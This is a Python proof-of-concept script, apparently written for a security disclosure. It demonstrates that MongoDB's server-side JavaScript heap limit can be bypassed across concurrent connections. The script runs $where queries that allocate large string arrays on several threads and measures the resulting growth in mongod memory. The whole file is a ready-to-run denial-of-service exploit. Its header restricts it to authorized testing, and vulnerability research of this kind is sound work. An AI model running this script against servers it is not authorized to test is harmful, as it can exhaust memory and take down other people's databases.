#!/usr/bin/env python3
"""
PoC: MongoDB server-side JS heap limit — per-scope thread-local accounting
allows K concurrent connections to bypass the aggregate cap.

Authorized-security-testing use only. Run against an instance you own.

Usage:
    python3 poc-js-heap.py [--host 127.0.0.1 --port 27017 --workers 4]

Expected output shape:
    jsHeapLimitMB: <limit>
    K=<workers> wall=... baseRSS=<x>MB peakRSS=<y>MB growth=<y-x>MB   # growth > limit ⇒ aggregate bypass
    workerN: where-err:...JavaScript execution interrupted...          # per-scope limit fires correctly
"""
import argparse, subprocess, threading, time
import pymongo

def mongod_rss_kb():
    out = subprocess.run(["ps", "-o", "rss=", "-C", "mongod"],
                         capture_output=True, text=True).stdout.strip()
    return sum(int(x) for x in out.splitlines()) if out else 0

ALLOC_JS = """
    (function() {
        globalThis.__a = globalThis.__a || [];
        for (var i = 0; i < 2000; i++) {
            globalThis.__a.push(new Array(1024*1024/8).fill(1.1).join('x'));
        }
        return false;
    })()
"""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=27017)
    ap.add_argument("--workers", type=int, default=4)
    ap.add_argument("--db", default="jsheaptest")
    ap.add_argument("--coll", default="things")
    args = ap.parse_args()
    uri = f"mongodb://{args.host}:{args.port}/?maxPoolSize=50"

    cli = pymongo.MongoClient(uri, serverSelectionTimeoutMS=5000)
    db = cli[args.db]
    db[args.coll].drop()
    db[args.coll].insert_many([{"i": i} for i in range(10)])

    limit = cli.admin.command("getParameter", "*").get("jsHeapLimitMB")
    print(f"jsHeapLimitMB: {limit}", flush=True)

    stop, peak = threading.Event(), [0]
    def sampler():
        while not stop.is_set():
            peak[0] = max(peak[0], mongod_rss_kb())
            time.sleep(0.25)
    st = threading.Thread(target=sampler); st.start()

    base = mongod_rss_kb()
    results = [None] * args.workers

    def worker(idx):
        c = pymongo.MongoClient(uri, serverSelectionTimeoutMS=20000, socketTimeoutMS=180000)
        try:
            cur = c[args.db][args.coll].find({"$where": ALLOC_JS})
            for _ in cur:
                pass
            results[idx] = "completed"
        except Exception as e:
            results[idx] = f"err:{type(e).__name__}:{str(e)[:90]}"
        finally:
            c.close()

    t0 = time.time()
    ts = [threading.Thread(target=worker, args=(i,)) for i in range(args.workers)]
    for t in ts: t.start()
    for t in ts: t.join(180)
    stop.set(); st.join()

    print(f"K={args.workers} wall={time.time()-t0:.1f}s baseRSS={base//1024}MB "
          f"peakRSS={peak[0]//1024}MB growth={(peak[0]-base)//1024}MB", flush=True)
    if limit:
        ratio = (peak[0] - base) / 1024.0 / limit
        print(f"aggregate growth = {ratio:.2f}x of the configured global limit", flush=True)
    for i, r in enumerate(results):
        print(f"  worker{i}: {r}", flush=True)
    cli.close()

if __name__ == "__main__":
    main()
